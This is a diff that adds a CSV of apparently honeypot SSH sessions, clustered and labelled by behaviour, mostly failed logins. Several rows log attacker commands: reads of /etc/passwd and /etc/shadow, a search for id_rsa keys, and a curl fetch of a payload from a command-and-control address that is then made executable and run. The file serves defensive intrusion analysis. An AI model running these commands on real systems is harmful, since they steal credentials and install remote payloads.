@@ -1,0 +1,55 @@
+session_id,dec_cluster,evidence_count,observed_command_categories,observed_commands,behavioural_interpretation,evidence
+f462237bf38f,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.052236
+d71473f8df1f,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.033859
+ac3d855b1968,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.024292
+a38c819b1e32,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.027873
+32869237e7ef,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.025731
+51fb60d24936,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.031487
+9d1ef0c58c99,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.041352
+ee5d28aed1d9,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 4.999603
+b05fefef8ce6,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.026818
+dd221d3d8907,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.042385
+ef9ae2a7b93e,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.017383
+89b931c57cf0,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.028491
+5f63552c8ff9,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.022803
+4d2398ddaebd,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.053773
+a97f79dabf58,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.087941
+e3bf9c0aba5a,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 0.012576
+88cbfb56c025,1,9,"credential_attack, file_system, privilege_escalation, reconnaissance","cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",Mixed/Unclassified,"Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.224239"
+61c8acc77ac0,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.016371
+b6631a298bbe,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.02615
+550d7307de41,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.043806
+4274b92e611f,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.035058
+beee8328f833,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.036278
+06023ffe4e8f,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.021606
+73eae1d369a7,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.038923
+4ce6f4212524,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.046908
+735512cb6ad6,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.020972
+e422abb51310,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.020491
+bdf3eea00cb2,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.036959
+8f4b8848e9d4,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.020075
+0c944d8ff17c,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.053884
+6f227371a1e8,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.026024
+0c159145218d,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.026591
+4f8484ce537b,0,1,file_system,cd /tmp,Command execution,Observed commands: cd /tmp; Command categories: file_system; Authentication success flag: 1; Session duration: 0.680853
+5a28ab472e4d,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.02418
+c1f665bb3d28,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.042517
+c8604f6bc04e,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.022226
+78a1934b13ae,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.024077
+549e5293bd98,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.027273
+6f2f15672ca5,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.020532
+ccba58b29c45,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.080267
+9a4ec106110f,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.027655
+0b7bcca97f3c,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.042789
+9754d144af49,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.025239
+3040ed94d428,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.027972
+76bbeca4b01a,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.022938
+fd8b54123ea9,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 3.03306
+b70abb50f812,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 5.034402
+af40e96bfe91,2,0,,,Credential-attack behaviour,Authentication success flag: 0; Session duration: 1.040026
+a4c62363d8d6,1,11,"file_system, file_transfer, networking, privilege_escalation, reconnaissance","./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit, find / -name id_rsa 2>/dev/null, id",Download or payload retrieval,"Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.458934"
+1f53fe8bd0ff,1,9,"credential_attack, file_system, privilege_escalation, reconnaissance","cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",Mixed/Unclassified,"Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 10.762586"
+ca8bbbfd6366,1,9,"credential_attack, file_system, privilege_escalation, reconnaissance","cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",Mixed/Unclassified,"Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.383391"
+a6c3b1926d4e,1,9,"credential_attack, file_system, privilege_escalation, reconnaissance","cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",Mixed/Unclassified,"Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.278874"
+916f7f25e36c,1,11,"file_system, file_transfer, networking, privilege_escalation, reconnaissance","./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit, find / -name id_rsa 2>/dev/null, id",Download or payload retrieval,"Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.895156"
+e6aae1f4915d,1,9,"credential_attack, file_system, privilege_escalation, reconnaissance","cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",Mixed/Unclassified,"Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 12.300721"
